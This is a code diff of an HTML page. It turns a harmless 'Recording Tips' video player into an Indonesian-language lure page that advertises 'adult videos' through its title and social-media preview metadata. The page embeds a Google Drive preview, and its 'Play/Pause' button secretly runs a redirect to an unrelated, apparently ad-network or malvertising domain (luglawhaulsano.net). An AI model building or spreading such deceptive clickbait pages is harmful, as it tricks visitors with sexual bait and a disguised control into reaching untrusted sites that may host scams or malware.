@@ -3,7 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Video Player</title>
+    <title>Tonton Video Dewasa - Konten Eksklusif untuk Anda!</title>
+
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Tonton Video Dewasa - Konten Eksklusif untuk Anda!">
+    <meta property="og:description" content="Akses video dewasa yang menarik hanya dengan satu klik. Nikmati pengalaman eksklusif sekarang juga!">
+    <meta property="og:image" content="https://res.cloudinary.com/iamandthebaik/image/upload/v1734105786/Screenshot_2024-12-13_230227_gwr7y8.png">
+    <meta property="og:url" content="https://example.com/video-dewasa">
+    <meta property="og:type" content="video.other">
+
+    <!-- Twitter Metadata -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Tonton Video Dewasa - Konten Eksklusif untuk Anda!">
+    <meta name="twitter:description" content="Akses video dewasa yang menarik hanya dengan satu klik. Nikmati pengalaman eksklusif sekarang juga!">
+    <meta name="twitter:image" content="https://res.cloudinary.com/iamandthebaik/image/upload/v1734105786/Screenshot_2024-12-13_230227_gwr7y8.png">
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://res.cloudinary.com/iamandthebaik/image/upload/c_thumb,w_200,g_face/v1734105786/Screenshot_2024-12-13_230227_gwr7y8.png" type="image/x-icon">
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,134 +37,50 @@
         .video-container {
             width: 90%;
             max-width: 720px;
-            background: linear-gradient(135deg, #ffffff, #eaeaea);
-            border: 1px solid #ccc;
+            background: #ffffff;
             border-radius: 12px;
-            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
             padding: 20px;
             text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        .video-container h1 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        video {
+        iframe {
             width: 100%;
+            height: 400px;
             border-radius: 8px;
-            margin-bottom: 15px;
-            outline: none;
+            border: none;
         }
 
         .controls {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 10px;
+            margin-top: 20px;
         }
 
         .controls button {
             padding: 10px 20px;
-            background: #007bff;
+            background: #d9534f;
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
-            transition: background-color 0.3s;
         }
 
         .controls button:hover {
-            background: #0056b3;
-        }
-
-        .tips {
-            margin-top: 20px;
-            text-align: left;
-        }
-
-        .tips h3 {
-            font-size: 20px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .tips ol {
-            padding-left: 20px;
-        }
-
-        .tips li {
-            margin-bottom: 8px;
-            font-size: 16px;
-            color: #555;
-        }
-
-        .next-btn {
-            display: block;
-            margin-top: 25px;
-            text-align: center;
-        }
-
-        .next-btn button {
-            background-color: #28a745;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 6px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .next-btn button:hover {
-            background-color: #218838;
+            background: #c9302c;
         }
     </style>
 </head>
 <body>
     <div class="video-container">
-        <h1>Recording Tips</h1>
-        <video id="videoPlayer" controls>
-            <source src="https://res.cloudinary.com/databasesiam/video/upload/v1728036722/vid_01_eits9m.mp4" type="video/mp4">
-            <track src="https://res.cloudinary.com/YOUR_CLOUD_NAME/raw/upload/v12345678/captions.vtt" kind="subtitles" srclang="en" label="English">
-            Your browser does not support the video tag.
-        </video>
-
+        <iframe src="https://drive.google.com/file/d/1tQ2HY8zfsX7piWb5bwNIAn1e18UAT5de/preview" frameborder="0" allowfullscreen></iframe>
         <div class="controls">
-            <button onclick="togglePlayPause()">Play/Pause</button>
-            <button onclick="restartVideo()">Restart</button>
+            <button onclick="redirect()">Play/Pause</button>
         </div>
-
-        <div class="tips">
-            <h3>Things to remember:</h3>
-            <ol>
-                <li>Read the question out loud and speak your thoughts clearly.</li>
-                <li>Take your time. Don’t rush through the tasks.</li>
-                <li>There are no wrong answers. Just give your honest opinion.</li>
-            </ol>
-        </div>
-    </div>
-
-    <div class="next-btn">
-        <button onclick="window.location.href='https://example.com/next-page'">Next</button>
     </div>
 
     <script>
-        function togglePlayPause() {
-            const video = document.getElementById('videoPlayer');
-            if (video.paused) {
-                video.play();
-            } else {
-                video.pause();
-            }
-        }
-
-        function restartVideo() {
-            const video = document.getElementById('videoPlayer');
-            video.currentTime = 0;
-            video.play();
+        function redirect() {
+            window.location.href = "https://luglawhaulsano.net/4/8565500";
         }
     </script>
 </body>
